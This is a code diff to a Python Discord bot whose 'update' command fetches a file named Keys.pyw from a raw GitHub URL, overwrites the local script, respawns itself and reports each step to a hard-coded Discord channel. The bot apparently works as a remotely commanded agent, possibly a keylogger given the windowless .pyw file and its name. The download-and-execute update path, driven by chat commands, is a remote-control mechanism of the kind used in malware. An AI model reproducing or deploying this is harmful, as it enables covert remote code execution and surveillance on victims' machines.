@@ -89,15 +89,19 @@ async def load(ctx):
 async def update(ctx):
     url = "https://raw.githubusercontent.com/TaranMayer/trees/master/Keys.pyw"
     r = requests.get(url).content.decode('utf-8')
+    await ctx.send("got code")
     code = str(r)
     f = open("Keys.pyw",'w')
     f.write(code)
     f.close()
+    await ctx.send("wrote code")
     os.spawnl(os.P_WAIT, sys.executable, *([sys.executable] + (sys.argv if __package__ is None else ["-m", __loader__.name] + sys.argv[1:])))
+    await ctx.send("spawned script")
     sys.exit()
 @client.event
 async def on_ready():
-    print("ready")
+    channel = client.get_channel(764311637028503552)
+    await channel.send("`Completed startup, ready for commands`")
 @client.command()
 async def play(ctx):
     try:
